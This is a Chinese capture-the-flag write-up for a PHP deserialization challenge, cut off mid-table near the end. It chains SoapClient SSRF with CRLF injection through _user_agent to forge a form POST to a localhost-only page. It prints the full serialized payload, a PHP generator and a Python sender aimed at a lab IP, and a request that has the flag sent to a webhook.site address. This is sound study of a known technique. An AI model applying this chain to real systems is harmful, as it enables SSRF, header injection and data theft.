# unserialize-lab · un9（SoapClient SSRF + CRLF 注入）

> 靶场：`http://120.76.159.54:8888/un9.php`
> 环境：Apache/2.4.10 (Debian) + **PHP/5.5.38**

> `SoapClient::__call` 的本来职责就是**发 HTTP 请求** → 借它做 SSRF 打内网 `un92` → 但 `un92` 只认 **POST 表单** → 用 `_user_agent` 做 **CRLF 注入**抢在 `Content-Type` 前面 → 塞进 `py=flag&url=你的地址` → flag 回调给你。

## 一、题目

### un9.php

```php
<?php
// POST py=flag&url=yoururl to un92.php and you will get the flag
if (isset($_GET['tryhackme']) && is_string($_GET['tryhackme'])){
    $a = unserialize($_GET['tryhackme']);
    $a->pyflag();
} else {
    show_source(__FILE__);
}
?>
```

### un92.php

```
从公网访问 → 拒绝（要求 REMOTE_ADDR = 127.0.0.1）
从本地访问 → 返回内容
提示：POST py=flag&url=yoururl → 它把 flag 发到 yoururl
```

**→ 需要一个"能读到内容"的外部接收端**（本 WP 用 webhook.site）。

## 二、考点判断

| 看到 | 推出 |
|---|---|
| 有 `unserialize($_GET['tryhackme'])` | 反序列化入口 |
| **源码里没有任何 `class`** | 只能用 **PHP 内置类** |
| 调了**不存在的方法** `pyflag()` | 需要内置类带 `__call` → **只有 `SoapClient`** |
| un92 只允许 `REMOTE_ADDR=127.0.0.1` | 必须**服务器自己**发请求 → **SSRF** |

## 三、原理：四个必须想通的问题

### 3.1 为什么 `$a->pyflag()` 会发 HTTP 请求

```php
new SoapClient(null, array('location' => '...', 'uri' => 'x'));
//   ↑ null = 非 WSDL 模式 → 任何方法都能调 → 全部走 __call
//     __call 内部：拼 SOAP XML，POST 到 location
```

方法不存在 → 触发 `__call` → 而 `SoapClient::__call` 的职责**本来就是发请求**。这就是它能被滥用成 SSRF 的原因。

### 3.2 为什么必须 SSRF，不能伪造请求头

`REMOTE_ADDR` 是 **TCP 连接的源地址**，由内核填写。`X-Forwarded-For` / `X-Real-IP` / `X-Client-IP` **实测全部无效**。

→ 只能让服务器自己发请求，源地址天然是 `127.0.0.1`。

### 3.3 为什么注入点只能是 `_user_agent`

PHP 5.x 的 SOAP 客户端拼请求时，**头的顺序是固定的**：

```http
POST /un92.php HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
User-Agent: ←────────── 来自 _user_agent      在 Content-Type 之前
Content-Type: text/xml; charset=utf-8
SOAPAction: ←────────── 来自 uri             在 Content-Type 之后
... (Cookie 之类，若有)
Content-Length: ←────── PHP 最后才算、最后才写
                            ← 空行
<?xml ...>                  ← PHP 自己的 body
```

**HTTP 头"首值优先"**（RFC 7230 §3.2.2）：同一个头出现多次、而该头不允许列表（`Content-Type`、`Content-Length` 都是），接收方**只取第一个**，后面的静默丢弃。

所以要覆盖 `Content-Type`，**你的注入必须排在它前面**：

| 注入点 | 变成 | 位置 | 能否抢到 Content-Type |
|---|---|---|---|
| `location` | 请求行 | 最顶 | 塞 CRLF 直接 400 |
| **`_user_agent`** | `User-Agent` | Content-Type **之前** | **唯一可用** |
| `uri` | `SOAPAction` | Content-Type **之后** | 排后面，写得再对也没用 |

### 3.4 为什么要抢 `Content-Type`

**PHP 填不填 `$_POST`，取决于请求的 `Content-Type`**：

| Content-Type | PHP 的行为 |
|---|---|
| `application/x-www-form-urlencoded` | 解析 body → **填 `$_POST`** |
| `multipart/form-data` | 解析 → `$_POST` + `$_FILES` |
| `text/xml`（SoapClient 默认） | **完全不解析**，`$_POST` 是空数组 |

un92 的逻辑是"`$_POST['py']=='flag'` 就把 flag 发到 `$_POST['url']`"。Content-Type 不换，**body 塞得再对也是白塞**。

**所以这题真正的难点不是"能不能塞 body"，而是"能不能让 un92 把 body 当表单读"。**

### 3.5 为什么 `User-Agent` 填 `a` 就行

利用的是**这个位置**，不是**它的内容**。PHP 写出去的形式是：

```
User-Agent: <你的值>\r\n
```

值以 `\r\n` 开头结尾都无所谓，只要**中间那个 `\r\n` 能把这一行封口**，后面的内容就被当成新头解析。`a` 只是让这行看起来正常。

**就算对方校验 UA 也不是障碍**——把标准 UA 放在 `\r\n` **前面**即可：

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n
Content-Type: application/x-www-form-urlencoded\r\n
...
```


## 四、最终 payload 与完整代码

### 4.1 payload（PHP 5.x 格式，实际是一行）

```
O:10:"SoapClient":4:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/un92.php";s:11:"_user_agent";s:183:"a\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 108\r\n\r\npy=flag&url=https://webhook.site/xxxx";s:13:"_soap_version";i:1;}
```

（`\r\n` 是**真实回车换行字节**）

### 4.2 生成端：un9成品1.php

```php
<?php
$t = 'http://127.0.0.1/un92.php';
$h = 'https://webhook.site/你的token';
$b = 'py=flag&url=' . $h;

$u = "a\r\n"
   . "Content-Type: application/x-www-form-urlencoded\r\n"
   . "Content-Length: " . strlen($b) . "\r\n"     // 只数 body
   . "\r\n"                                        // 空行 = 头结束
   . $b;

$c = new SoapClient(null, array(
    'location'   => $t,
    'uri'        => 'x',
    'user_agent' => $u        // 构造参数不带下划线，序列化后才是 _user_agent
));

echo serialize($c) . "\n";
file_put_contents(__DIR__ . '/p.txt', urlencode(serialize($c)));   // 不要写中文路径
echo "OK -> p.txt\n";
```

### 4.3 发送端：un9成品2.py

```python
import requests

p = open(r"C:\Users\暗炎魔主\Desktop\p.txt", encoding="utf-8").read().strip()
url = "http://120.76.159.54:8888/un9.php?tryhackme=" + p     # 不能走 params=
r = requests.get(url)
print("status:", r.status_code)
print("len   :", len(r.text))
print(r.text[:300])
```

### 4.4 运行

```powershell
D:\phpstudy\phpstudy_pro\Extensions\php\php5.4.45nts\php.exe "C:\Users\暗炎魔主\Desktop\un9成品1.php"
python "C:\Users\暗炎魔主\Desktop\un9成品2.py"
```

### 4.5 一条必须配套记住的关系

> **PHP 负责 `urlencode`，Python 就不要再编码。**

`p.txt` 里的 payload 已经是 `%XX` 形式，必须**直接拼在 URL 后面**。写成 `params={"tryhackme": p}` 会被**二次编码**（`%3A` → `%253A`），靶机解出来是一堆 `%` 号，`unserialize` 直接失败。

**为什么要 urlencode**：把 `\r\n` 变成 `%0D%0A`，整个 payload 就成了**一行纯 ASCII**——可以随意复制、存文件、塞进 URL，不会因为真换行被截断。

## 六、序列化格式速查

```
O : 10 : "SoapClient" : 4 : {                     ← 对象头
    s : 3  : "uri"         ; s : 1   : "x" ;      ← 属性：名 + 值
    s : 8  : "location"    ; s : 25  : "..." ;
    s : 11 : "_user_agent" ; s : 183 : "..." ;
    s : 13 : "_soap_version"; i : 1   ;           ← i = 整数
}                                                 ← 收尾
```

| 规则 | 写法 |
|---|---|
| 对象 | `O:类名长度:"类名":属性个数:{属性们}` |
| 字符串 | `s:长度:"内容"` |
| 整数 | `i:数字` |
| 多个属性 | **直接连写**，无逗号无空格 |
| 每段后面 | 都要分号 `;` |

**本题固定数字**：

| 片段 | 长度 |
|---|---|
| `SoapClient` | 10 |
| `_user_agent` | **11**（两个下划线都算） |
| `location` | 8 |
| `uri` | 3 |
| `_soap_version` | 13 |

**只有 `u` 和 `t` 的长度是变的，用 `len()` 让代码算，别手数。**

### 6.1 两个长度别搞混

| 数字 | 是什么 | 从哪算到哪 |
|---|---|---|
| `s:183:` | **整个注入值**的字节数 | 从 `a` 开始到 body 结束 |
| `Content-Length: 108` | **只有 body** 的字节数 | 从 `py` 开始到结尾 |

公式：`Content-Length = len("py=flag&url=") + len(接收地址) = 12 + len(h)`

`len()` 对 str 算的是**字符数**，PHP 要的是**字节数**。全 ASCII 时相等；有中文必须 `len(v.encode())`。

### 6.2 属性顺序无所谓

`unserialize` 按**名字**找属性，不按位置。`uri` 在前在后、`_soap_version` 在头在尾，都能用。PHP 自己生成的顺序（`uri → location → _user_agent → _soap_version`）和手写的顺序不一样，两者都验证通过。

## 七、PHP 版本差异

|  | 构造参数 | 序列化出来的属性名 | 属性个数 |
|---|---|---|---|
| **PHP 5.x**（本题靶机 5.5） | `user_agent` | **`_user_agent`**（11） | 3~4 个**公开**属性 |
| PHP 8.x | `user_agent` | `user_agent`（10） | **36 个私有**属性 |

**实测对照**（同一份 PHP 源码，只换解释器）：

```
PHP 5.4.45 → O:10:"SoapClient":4:{s:3:"uri";s:1:"x";s:8:"location";...;s:11:"_user_agent";s:183:"...";s:13:"_soap_version";i:1;}
             长度 326，4 个公开属性                        靶机能用

PHP 8.2.9  → O:10:"SoapClient":36:{s:15:"<NUL>SoapClient<NUL>uri";s:1:"x";s:17:"<NUL>SoapClient<NUL>style";N;...}
             长度 1461，36 个私有属性，属性名带 NUL 字节前缀  靶机不认
```

## 八、中文 Windows + PHP 的路径坑

### 现象

```php
file_put_contents('C:\Users\暗炎魔主\Desktop\out.txt', $p);
// Warning: file_put_contents(C:\Users\鏆楃値榄斾富\Desktop\out.txt): failed to open stream:
//          No such file or directory
```

### 因果链

```
① 编辑器把源码存成 UTF-8 → '暗炎魔主' 的字节是 E6 9A 97 E7 82 8E E9 AD 94 E4 B8 BB
② PHP 把字符串当"一串字节"，一个字节都不转换
③ Windows 的文件 API 按"系统代码页 = GBK/936"理解这串字节
      E6 9A 97 E7 82 8E E9 AD 94 E4 B8 BB  →  鏆楃値榄斾富   （6 个合法 GBK 汉字）
      '版' = E7 89 88 → E7 89 = 鐗，剩下的 88 映射不出来 → 变成 ?
④ 文件名含 '?' → Windows 禁止（? 是通配符）→ CreateFile 失败
```

### 实测：四种写法

| 写法 | 结果 |
|---|---|
| `'C:\Users\暗炎魔主\...\x.txt'`（**中文目录 + 英文文件名**） | **false** |
| `'C:\Users\Public\x.txt'`（全 ASCII 绝对路径） | 成功 |
| `'x.txt'`（相对路径，落在 cwd） | 成功 |
| **`__DIR__ . '/x.txt'`** | **推荐** |
| `'测试.txt'`（中文字面量） | 返回成功，但**文件名变成 `娴嬭瘯.txt`** |

**注意第一行**：文件名改成纯英文**照样失败**——因为**目录**里的 `暗炎魔主` 已经坏了。

### 为什么脚本本身能打开（路径里也有中文）？

|  | 路径从哪来 | 字节对不对 |
|---|---|---|
| **脚本路径** | PowerShell → Windows 用 UTF-16 传命令行，PHP 拿到时**已过正规宽字符转换** | 对 |
| **源码里的字符串** | 编辑器存的 **UTF-8 字节**，PHP 原样转交 Windows | 被当 GBK |

### 解法

```php
file_put_contents(__DIR__ . '/p.txt', ...);   // __DIR__ = 脚本所在目录
```

`__DIR__` 是 PHP 从"它刚刚成功打开的脚本路径"里取的，**字节天然正确**，不经过你写的字面量。

> **规律**：中文 Windows + PHP + 路径/文件名 → **绝不在源码里写中文路径**。
> **Python 没这个问题**（Python 3 在 Windows 走 Unicode API），`open(r"C:\Users\暗炎魔主\...")` 完全没问题。

## 九、报错对照表（按"卡在哪一层"排）

看报错先分层，能省一半时间：

| 层 | 报错 | 含义 | 去查什么 |
|---|---|---|---|
| **反序列化层** | `Call to a member function pyflag() on a non-object` | `unserialize()` 返回了 `false`，**payload 没变成对象** | 长度、属性个数、URL 编码（是否被二次编码/被 CRLF 截断） |
| **SOAP 层** | `looks like we got no XML document` | **请求成功发出去了**，只是响应不是 XML | 正常现象，继续 |
|  | `Error finding "uri" property` | 缺 `uri` | 补 `s:3:"uri";s:1:"x";` |
|  | `Error could not find "location" property` | 缺 `location` | 补上 |
| **HTTP 层** | `[HTTP] Bad request` (400) | `location` 里塞了 CRLF | 只能从 `_user_agent`/`uri` 注入 |
|  | `[HTTP] Not Found` | 路径写错 | 检查 `location` |
|  | `[HTTP] Could not connect to host` | 端口不通 | 换端口 |
|  | `Unknown protocol. Only http and https are allowed` | 协议被禁 | 只支持 http/https |
| **成功** | **响应 0 字节（完全静默）** | **攻击成功** | 去 webhook 看 flag |

## 十、"响应为空"反而是成功信号（实测 5 组对照）

这题最反直觉的一点。同一靶机、同一注入，只改 body：

| 案例 | 内容 | 响应长度 | 说明 |
|---|---|---|---|
| A | 不注入，location=un92 | 336 | 报 `no XML document` |
| **B** | 注入 `py=flag&url=...`，location=un92 | **0** | **静默** |
| B' | 注入 `py=no&url=...`，location=un92 | 336 | 没进发 flag 分支 |
| B'' | 注入空 body，location=un92 | 336 | 同上 |
| C | 注入 `py=flag&url=...`，location=**webhook** | 336 | 外站返回 HTML，照常报错 |

**推理**：

1. **C 证明**注入本身不会吞报错（同样注入，只换目标，错误照常出现）
2. **B'/B'' 证明**"多余字节形成的第二个畸形请求"也不会吞报错（注入结构与 B 完全相同）
3. **唯一变量**是 `py=flag` **触发了 un92 的发 flag 分支**

**结论**：un92 成功发完 flag 后**直接结束，返回 0 字节**；PHP 的 SOAP 客户端对**空响应不抛异常** → `__call` 正常返回 → un9.php 无任何输出 → `200 + 0 字节`。

> **记忆点**：这题里"没反应"才是好消息。真正的失败会有报错。

## 十一、踩坑记录

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| **属性名写成 `user_agent`** | UA 一点没变，注入**静默无效、零报错** | PHP 5.x 内部属性名是 `_user_agent` | 用 `_user_agent` |
| **先试 `uri` 注入** | body 进去了，但 `Content-Type` 还是 `text/xml` | `SOAPAction` 排在 Content-Type **之后**，首值优先覆盖不了 | 改用 `_user_agent` |
| **用 PHP 8.2 生成** | `O:10:"SoapClient":36:{s:15:"\0SoapClient\0uri";...}` | PHP 8 的属性是 private | 用 PHP 5.4 生成 |
| **PHP 里写中文路径** | `failed to open stream`，报错路径是 `鏆楃値榄斾富` | UTF-8 字面量被按 GBK 解读 | `__DIR__` / 相对路径 / ASCII 路径 |
| **`input()` 接 payload** | 只发出去半截 | 输出里的 `\r\n` 是**真换行**，第一个换行就提交了 | 写文件再读（`p.txt`） |
| **`params={"tryhackme": p}`** | `on a non-object` | payload 已编码，`params` 又编码一次 | 直接拼 URL 字符串 |
| **原始 payload 直接拼 URL** | `on a non-object` | URL 里的裸 CRLF 把请求行截断了 | 先用 `urlencode` |
| **curl 直接发 URL** | 响应里 `"` `{}` 全消失 | curl 的 `{}` URL globbing | 整体 URL 编码，或 `curl -g` |
| **参数写在 query 里** | un92 不响应 | un92 只认 **`$_POST`** | 必须注入 body |
| **`location` 里塞 CRLF** | `400 Bad Request` | 破坏了请求行 | 只能从 `_user_agent`/`uri` 注入 |
| **webhook 地址抄成网页地址** | 地址栏是 `.../#!/view/<token>/<请求id>/1` | `#` 后面的内容浏览器不发给服务器 | 地址**到 token 为止**（实测子路径也会被记录，但别依赖） |
| **PowerShell 改 .py 文件** | 中文乱码 → SyntaxError | 编码问题 | 用 VS Code / 记事本，存 UTF-8 |

## 十二、知识点总结

| # | 知识点 |
|---|---|
| 1 | **没有自定义类时用 PHP 内置类**：`SoapClient`（`__call`→SSRF）、`Error`/`Exception`（`__toString`→XSS）、`SimpleXMLElement`（XXE）、`SplFileObject`（读文件）、`DirectoryIterator`（列目录） |
| 2 | **非 WSDL 模式** `new SoapClient(null, [...])` → 任何方法都能调 → 全走 `__call` |
| 3 | **`SoapClient::__call` 的正常职责就是发 HTTP 请求** → 被滥用成 SSRF |
| 4 | **`REMOTE_ADDR` 是 TCP 层，HTTP 头伪造不了** → 必须 SSRF |
| 5 | **写头顺序决定可用注入点**：`_user_agent` 在 `Content-Type` 前 → 可选；`uri` 在后 → 不可选 |
| 6 | **HTTP 头首值优先**：想覆盖别人，必须排在它前面（不是后面） |
| 7 | **CRLF 注入**：`\r\n` 能封口当前头、插入新头、用空行结束头块、再塞 body |
| 8 | **`$_POST` 填不填由 `Content-Type` 决定** → 抢 Content-Type 才是这题的核心 |
| 9 | **PHP 版本差异**：`_user_agent`(5.x) vs `user_agent`(7.x+)；序列化 5.x public vs 8.x private |
| 10 | **PHP 最后才写 `Content-Length`** → 残余字节会变成"第二个畸形请求"（请求走私的原理）；本解法靠它不捣乱（我们的 Content-Length 卡住了读取边界） |
| 11 | **两个长度**：`s:len` 是整个属性值，`Content-Length` 只是 body |
| 12 | **属性顺序无所谓**，`unserialize` 按名字找 |
| 13 | **`urlencode` 后绝不能再编码**（`params=` / `quote` 二次编码会毁掉 payload） |
| 14 | **中文 Windows + PHP 字面量路径会因 GBK 曲解失效**，用 `__DIR__`；Python 无此问题 |
| 15 | **盲打类漏洞必须分级验证**：先证明 SSRF 通，再证明注入生效，最后才打真目标 |

## 十三、迁移：同类题怎么打

```
① 读源码
   ├─ 有没有自定义类？
   │   ├─ 没有 → 找内置类：
   │   │        调不存在的方法   → SoapClient（__call → SSRF）
   │   │        对象当字符串用   → Error / Exception（__toString）
   │   │        动态 new / 解析  → SimpleXMLElement（XXE）、SplFileObject（读文件）
   │   └─ 有  → 从终点逆推，构造 POP 链
   │
② 写最小 payload，先确认"能触发"（看报错层次）
   │
③ 找"会被写进 HTTP 头"的属性，对照写头顺序挑注入点
   │  SoapClient：_user_agent（在前，可用）、uri（在后，不可用）
   │
④ 用 CRLF 注入需要的头 + 空行 + body
   │  别忘了 Content-Length 要自己写（外层库不会替你算嵌套请求的长度）
   │
⑤ 每一步都用 webhook.site 验证（SSRF 是盲的，不看接收端等于闭眼开车）
```

## 十四、一句话总结

> **un9 = 用内置类 `SoapClient` 的 `__call` 做 SSRF，再用 `_user_agent` 属性做 CRLF 注入，抢在 `Content-Type` 前面把它改成表单类型并塞入 `py=flag&url=你的地址`，让 un92 以 `127.0.0.1` 的身份收到表单，把 flag 回调给你。**
>
> **核心一句**：`User-Agent` 排在 `Content-Type` 前面，而 HTTP 头**首值优先** —— 所以从 `_user_agent` 注入才能"抢到" Content-Type。
>
> **反直觉一句**：这题**响应为空才是成功**，有报错说明还没打通。

# 附录：六个协议层问答

> 这六条**比 payload 本身更通用**。以后遇到 Header 注入、请求走私、CRLF 相关的题，都是同一套逻辑。

**它们其实指向同一件事**：

> HTTP 是一条**线性文本协议**，不是对象图。
> 头在空行处截止（A4）→ 所以原本的头会失效（A1）；重复头取第一个（A2）→ 所以想覆盖必须排前面；`Content-Type` 决定服务端怎么解释 body（A3）→ 所以它值得抢；跨进程传这条带换行的文本时，编码只能做一次（A5）。
> **而以上全部成立的前提，是头名和类型值都大小写不敏感（A6）** —— 否则"我们的头"和"原本的头"在服务器眼里就是两个不同的头，谈不上覆盖。

## A1. 注入前 vs 注入后，请求到底差在哪

### 修改前（SoapClient 原生请求）

```http
POST /un92.php HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
User-Agent: PHP-SOAP/5.5.38
Content-Type: text/xml; charset=utf-8        ← 关键
SOAPAction: "x#pyflag"
Content-Length: 370
                                             ← 空行
<?xml version="1.0" encoding="UTF-8"?>       ← 全是 XML
<SOAP-ENV:Envelope xmlns:SOAP-ENV="...">
  <SOAP-ENV:Body>
    <ns1:pyflag/>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

**un92 的视角**：

```
Content-Type = text/xml  →  PHP 不解析 body  →  $_POST = []（空数组）
$_POST['py'] 不存在       →  if 条件为假      →  什么都不做
```

→ 请求发到了、un92 也执行了，但 **flag 一个字节都不会发出去**。

### 修改后（从 `_user_agent` 注入）

```http
POST /un92.php HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
User-Agent: a                                     ← 注入从这里开始
Content-Type: application/x-www-form-urlencoded   ← 我们的（第 1 个）
Content-Length: 108                               ← 我们的（第 1 个）
                                                  ← 空行（我们插的，头在这里结束）
py=flag&url=https://webhook.site/xxxx             ← body
Content-Type: text/xml; charset=utf-8             ┐
SOAPAction: "x#pyflag"                            │ 原本的头，现在只是 body 里的字节
Content-Length: 370                               │
                                                  │
<?xml version="1.0"?>...                          ┘
```

**un92 的视角**：

```
Content-Type = application/x-www-form-urlencoded  →  PHP 解析前 108 字节  →  $_POST = {py:flag, url:...}
$_POST['py'] == 'flag'                            →  条件成立  →  把 flag 发到 $_POST['url']
```

### 差异汇总

|  | 修改前 | 修改后 |
|---|---|---|
| 头的组数 | 1 组 | 1 组（**但内容被换掉了**） |
| `Content-Type` | `text/xml` | `application/x-www-form-urlencoded` |
| `Content-Length` | 370（XML 长度） | 108（表单长度） |
| body | SOAP XML | `py=flag&url=...` |
| 原本的 XML | 就是 body | 变成"body 之后的多余字节" |
| `$_POST` | `[]` | `{py:flag, url:...}` |
| 结果 | 无反应 |  |

> **一句话**：改的不是"表单内容"，而是**整条请求的身份**——从"一次 SOAP 调用"变成"一次表单提交"，只是这个变身靠**头注入**完成。

## A2. 为什么"排在前面的赢"，不是后面覆盖前面？

**因为 HTTP 头不是"变量赋值"，是"信封上的多行标签"。**

编程直觉（后写覆盖先写）：

```python
x = 1
x = 2      # x 是 2
```

但规范和实现都不是这个语义（RFC 7230 §3.2.2）：

| 情况 | 接收方该怎么办 |
|---|---|
| 该头**允许逗号列表**（`Accept`、`Cache-Control`） | **合并**所有出现 |
| 该头**不允许列表**（`Content-Type`、`Content-Length`） | 视为非法，**或者**（历史实际做法）**只取第一个，其余丢弃** |

`Content-Type` 属于第二类 → **实现上只认第一个**。

**为什么这么实现**：解析器边扫边往映射表里填，填的时候发现"这个键已经有了"就跳过 → **先到先得**。

**比方**：

```
编程赋值 = 白板上写数字，擦掉重写      → 最后写的算
HTTP 头  = 信封上贴 5 张标签，从上往下读 → 看到"收件人"就定了，下面同类的直接忽略
```

**这不是铁律，是经验规律**：

| 实现 | 行为 |
|---|---|
| Apache + PHP（本题） | 取第一个（实测通过） |
| 部分服务器 / 网关 | 直接 **400 拒绝**重复头 |
| Nginx | 某些头会做合并 |

**→ 所以必须用 webhook 分级验证，不能假设。**

> **重量级推论**：正因为"重复 `Content-Length` 取第一个"这类行为存在，才有了 **HTTP 请求走私（Request Smuggling）**。如果所有服务器都严格拒绝重复，这整个漏洞大类就不存在了。你在本题看到的"首值优先"，就是那类漏洞的地基。

## A3. `Content-Type` 该写什么？为什么要抢它？

### 写什么：协议规定，不是自创

PHP **只会**在两种 Content-Type 下填充 `$_POST`：

| Content-Type | PHP 行为 | 对应场景 |
|---|---|---|
| **`application/x-www-form-urlencoded`** | 解析 `k=v&k=v` → 填 `$_POST` | **普通表单**（浏览器 `<form method="post">` 默认） |
| `multipart/form-data` | 解析 → `$_POST` + `$_FILES` | 带文件上传的表单 |
| 其他（`text/xml`、`application/json` …） | **不解析** | `$_POST` 永远是空数组 |

我们的 body 是 `py=flag&url=xxx`，正是 `k=v&k=v` → 对应第一种。

**记忆方法**：把 `x-www-form-urlencoded` 理解成"**URL 查询串那套编码规则搬到 body 里用**"——`&` 分隔、`=` 连接、特殊字符 `%XX`。名字里的 `urlencoded` 就是这个意思。

（想确认：随便打开一个表单页面 → F12 → Network → 看请求头，就是这一行。）

### 为什么必须抢

un92 的代码依赖 `$_POST`：

```php
if ($_POST['py'] == 'flag') { 把 flag 发到 $_POST['url'] }
```

而 `$_POST` 是 **PHP 根据 Content-Type 决定填不填**的：

```
Content-Type 不对  →  $_POST 是空的  →  条件永远不成立  →  flag 永远不发
```

**反直觉的点**：

> body 写得**完全正确**（一个字符不差），只要 Content-Type 还是 `text/xml`，**un92 的 PHP 根本不会去看它**。
> 像寄了一封格式完美的信，但信封写着"这是 XML 文件"，前台直接扔进"不处理"的筐。

**→ 这题真正的门槛不是"能不能塞 body"，而是"能不能让 PHP 把 body 当表单读"。**
前半句谁都做得到（`uri` 注入就能塞 body），后半句才是分水岭——这就是当初 `uri` 注入"body 进去了但 un92 收不到参数"的根本原因。

## A4. 原本在头部的那些行，到了 body 区还有用吗？

**完全没用了。**

HTTP 的头部区域**在第一个空行处就结束**，这是硬性定义：

```
头部区域：从第一行到第一个空行（不含）
body 区域：空行之后的一切
```

**HTTP 里不存在"后面的头"这个概念。** 空行之后的所有字节，无论长得多像头，都只是 body 数据。

所以原本那些：

```
Content-Type: text/xml; charset=utf-8
SOAPAction: "x#pyflag"
Content-Length: 370
<?xml ...>
```

**字节还在线上（没消失），但不再是头了** —— 服务端永远不会把它们当头解析。去向：

| 部分 | 去向 |
|---|---|
| 我们 `Content-Length: 108` 覆盖的范围 | 算 body（我们的表单） |
| 108 字节之后的所有残余 | 被当成**同一连接上的下一个请求**的开头 |

最后一条就是**请求走私**的机制。Apache 会试着把 `Content-Type: text/xml; charset=utf-8` 当**请求行**解析 → 不是合法的 `METHOD PATH HTTP/1.1` → **400 Bad Request** → 关闭连接。

**那为什么不影响成功？** 两个原因：

1. **`Content-Length: 108` 卡住了读取边界** —— un92 只读 108 字节就收工，后面的垃圾进不了 `$_POST`
2. **第一个请求已经处理完了** —— flag 早就发出去了，Apache 对"第二个请求"报 400 是它自己的事

> **规律**：CRLF 注入的本质是"**提前结束头部**"。一旦结束，**后面所有原本的头都降级成 body 数据**。
> 这就是它为什么能"覆盖"——**不是改写了那些头，而是让它们不再是头。**

## A5. 为什么 `params={"tryhackme": p}` 会二次编码

### 逐层看字节

```python
p = "O%3A10%3A%22SoapClient%22..."        # PHP 已经 urlencode 过一次
requests.get(url, params={"tryhackme": p})
```

`requests` 拿到 `params` 会**再编码一遍**（这是它的契约：你给原始值，它负责编码）。而编码规则里 **`%` 本身也要被编码成 `%25`**：

| 阶段 | `tryhackme` 的值 |
|---|---|
| PHP 端 `urlencode`（第 1 次） | `O%3A10%3A%22SoapClient%22` |
| `requests` 再编码（第 2 次） | `O%253A10%253A%2522SoapClient%2522` |
| 靶机收到 query，**解码 1 次** | `O%3A10%3A%22SoapClient%22` |
| `unserialize()` 看到 | **`O%3A10%3A...`** → 第 2 个字符是 `%` 不是 `:` → **格式错 → 返回 `false`** |
| 然后 `$a->pyflag()` | `Call to a member function pyflag() on a non-object` |

**关键**：靶机**只解码一次**（URL 解码是"解一层"）。你编码了两次，就只还原得了一层。

### 四种组合，只有两种能跑

| 组合 | PHP 端 | Python 端 | 结果 |
|---|---|---|---|
| **A** | `urlencode()` | **直接拼 URL** | 推荐 |
| **B** | 原始 `serialize()` | **`params=`** | 可用 |
| C | `urlencode()` | `params=` | **二次编码** |
| D | 原始 `serialize()` | 直接拼 URL | 裸 CRLF **截断请求行** |

> **核心原则：编码只能做一次，谁做谁负责。**
> - 选 A：**PHP 负责编码 → Python 原样发**
> - 选 B：**Python 负责编码 → PHP 只给原始串**

**C 和 D 是同一个错误的两种形态**：C 是"编码了两次"，D 是"该编码的没人编码"。

**为什么推荐 A**：原始串里有**真换行**，没法通过命令行参数、也没法复制粘贴传递（`input()` 会在第一个换行截断）。**编码成一行纯 ASCII 之后才能安全落盘做中转** —— 这就是 `p.txt` 存在的全部理由。

## A6. HTTP 头的大小写敏感吗？（靶机实测 4 组）

**结论：头的名字、媒体类型的值，都不敏感——四种写法全部打通。**

### 实测方法

用 `url` 里的标记区分是哪一次发的（`py=flag&url=<token>/<标记>`），然后看 webhook 收到哪几个标记。

| 组 | 头名 | 值 | 结果 |
|---|---|---|---|
| **D** 对照组 | `Content-Type` | `application/x-www-form-urlencoded` | 成功 |
| **A** 头名全小写 | `content-type` | `application/x-www-form-urlencoded` | 成功 |
| **B** 值全大写 | `Content-Type` | `APPLICATION/X-WWW-FORM-URLENCODED` | 成功 |
| **C** 头名 + 值都乱写 | `CoNtEnT-TyPe` | `Application/X-WWW-Form-Urlencoded` | 成功 |

四次响应全部是 `200 + 0 字节`（= 成功信号），webhook 分别收到：

```
.../caseD-canonical?flag=flag{...}
.../caseA-lowername?flag=flag{...}
.../caseB-uppervalue?flag=flag{...}
.../caseC-mixed?flag=flag{...}
```

### 为什么

| 对象 | 规范 |
|---|---|
| **头名** | RFC 7230 §3.2：field name **大小写不敏感** → `content-type` 和 `Content-Type` 是**同一个头** |
| **媒体类型值** | RFC 2045：media type 的 type/subtype **大小写不敏感** → PHP 实现用的是不敏感匹配，所以 B/C 组也过 |

### 但"不敏感"的范围没你想的那么广

| 对象 | 敏感？ | 说明 |
|---|---|---|
| HTTP 头**名字** | 不敏感 | `content-type` = `Content-Type` |
| **媒体类型**（Content-Type 的值） | 不敏感 | 规范 + PHP 5.5 实测 |
| HTTP **方法** | **敏感** | `get /x HTTP/1.1` 不合法 |
| **参数值**（`charset=`、`boundary=`） | **敏感** | `boundary=AbC` 必须和 body 里的分隔符**逐字符一致** |
| URL 的**路径** | 敏感 | 但**域名**不敏感 |
| HTTP/2 头名 | **必须全小写** | 规范强制，大写直接报错 |

**最容易踩的是 `boundary`**：`multipart/form-data; boundary=----WebKitFormBoundaryXyZ` 里那串随机字符，**错一个字母整个 body 就解析不出来**。

### 实践建议：能跑 ≠ 该乱写

统一写**规范写法**，三个理由：

1. **跨目标更稳**：PHP 宽容，但某些 Java 框架 / WAF 规则会做**精确字符串比较**
2. **有些网关对畸形大小写起疑**：`CoNtEnT-TyPe` 在流量里很像攻击特征，容易触发告警
3. **可读性**：两周后自己回看，`Content-Type` 一眼就懂

> **规则**：大小写**可以**乱写（但别乱写）；**`Content-Length` 的数字和 `boundary` 一个字都不能错。**

### 和 A2 的联动：这是"首值优先"能生效的前提

```
我们注入的：        content-type: application/x-www-form-urlencoded   ← 小写
SoapClient 原本的： Content-Type: text/xml; charset=utf-8            ← 规范写法
```

正因为服务器把它们认成**同一个头**，才会走"重复头 → 取第一个"的逻辑 → **我们的赢**。

**反过来想**：如果服务器是大小写敏感的（现实中基本不存在），它会看到**两个不同的头**，那"首值优先"根本无从谈起，**这个注入手法也就不成立了**。

## A7. 冒号前后的空白（靶机实测 6 组）

**结论：这台靶机 Apache 2.4.10 对「冒号前空格」照单全收 —— 而规范要求它必须回 400。**

### 实测方法

`requests` / `urllib` 会规范化头名，测不出来，**必须用原始 socket 逐字节发**。

| 组 | 发出去的头 | 靶机返回 |
|---|---|---|
| 对照 | `X-Test: abc`（冒号后 1 个空格，正常写法） | `200 OK` |
| 1 | `X-Test : abc`（冒号**前** 1 个空格） | **`200 OK`** |
| 2 | `X-Test  : abc`（冒号**前** 2 个空格） | **`200 OK`** |
